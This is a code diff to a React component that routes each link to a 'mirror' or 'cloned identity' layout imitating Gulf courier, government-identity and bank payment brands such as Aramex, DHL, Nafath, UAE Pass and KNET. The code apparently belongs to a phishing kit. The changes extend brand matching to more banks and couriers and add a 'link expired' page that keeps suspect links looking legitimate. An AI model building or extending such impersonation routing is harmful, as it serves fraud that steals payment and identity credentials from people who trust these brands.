@@ -1,6 +1,6 @@
 import React from 'react';
 import { useSearchParams } from "react-router-dom";
-import { PaymentEntityConfig, resolveEntity } from "@/config/gccPaymentEntities";
+import { PaymentEntityConfig, resolveEntity, paymentEntities } from "@/config/gccPaymentEntities";
 import { 
   NafathMirrorLayout, 
   UAEDirhamMirrorLayout, 
@@ -13,8 +13,8 @@ import {
   AramexMirrorLayout, 
   DhlMirrorLayout 
 } from "./CloneLayouts";
-import { resolveGovService } from "@/lib/governmentPaymentServices";
 import { ThemedHeader } from "@/components/ui/ThemedHeader";
+import { LinkExpired } from "./LinkExpired";
 
 interface MirrorPageWrapperProps {
   children: React.ReactNode;
@@ -28,9 +28,8 @@ interface MirrorPageWrapperProps {
 /**
  * MirrorPageWrapper
  * 
+ * GCC_OMNI_ANTI_404_PRESENCE_V600
  * Central Visual Identity Router.
- * Implements Individual Sovereign Cloning (V350).
- * Achieve 1:1 Identity Sync across all sectors.
  */
 export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({ 
   children, 
@@ -42,10 +41,22 @@ export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({
 }) => {
   const [searchParams] = useSearchParams();
   
-  // Priority: 1. Passed ID, 2. URL Param, 3. Link Payload, 4. Default
-  const companyKey = entityId || searchParams.get("company") || linkData?.payload?.service_key || 'aramex';
-  const normalizedKey = companyKey.toLowerCase().replace(/[^a-z0-9]/g, '');
-  const entityConfig = resolveEntity(companyKey);
+  const companyKey = entityId || searchParams.get("company") || linkData?.payload?.service_key;
+  
+  // ANTI-404: If no companyKey and no default children, show error
+  if (!companyKey && !children) {
+    return <LinkExpired config={paymentEntities.DEFAULT} />;
+  }
+
+  const normalizedKey = (companyKey || '').toLowerCase().replace(/[^a-z0-9]/g, '');
+  const entityConfig = resolveEntity(companyKey || 'default');
+
+  // GRACEFUL ERROR: If entity resolution fails or key is clearly invalid
+  if (entityConfig.id === 'DEFAULT' && companyKey && companyKey !== 'default' && !normalizedKey.includes('pay')) {
+     // If we have a key but it resolved to default and doesn't look like a generic payment, 
+     // it's likely a broken/expired service link.
+     return <LinkExpired config={entityConfig} />;
+  }
 
   // 1. ARAMEX (Cloned Identity)
   if (normalizedKey.includes('aramex')) {
@@ -65,8 +76,8 @@ export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({
     );
   }
 
-  // 3. UAE DIRHAM (Digital Dubai / UAE Pass)
-  if (normalizedKey.includes('dubai') || normalizedKey.includes('uaepass') || normalizedKey.includes('dirham')) {
+  // 3. UAE DIRHAM / UAE PASS / DUBAI PAY
+  if (normalizedKey.includes('dubai') || normalizedKey.includes('uaepass') || normalizedKey.includes('dirham') || normalizedKey.includes('uae')) {
     return (
       <UAEDirhamMirrorLayout config={entityConfig} title={title}>
         {children}
@@ -110,12 +121,21 @@ export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({
     );
   }
 
-  // 8. KNET (Banking Standard)
-  if (normalizedKey.includes('knet') || normalizedKey.includes('benefit')) {
+  // 8. KNET / BENEFIT / MAAL / JAYWAN
+  if (normalizedKey.includes('knet') || normalizedKey.includes('benefit') || normalizedKey.includes('maal') || normalizedKey.includes('jaywan')) {
     return (
       <KnetMirrorLayout config={entityConfig}>
         {children}
       </KnetMirrorLayout>
+    );
+  }
+
+  // 9. SMSA / FEDEX (Shipping generic)
+  if (normalizedKey.includes('smsa') || normalizedKey.includes('fedex')) {
+    return (
+      <AramexMirrorLayout config={entityConfig} title={title}>
+        {children}
+      </AramexMirrorLayout>
     );
   }
 
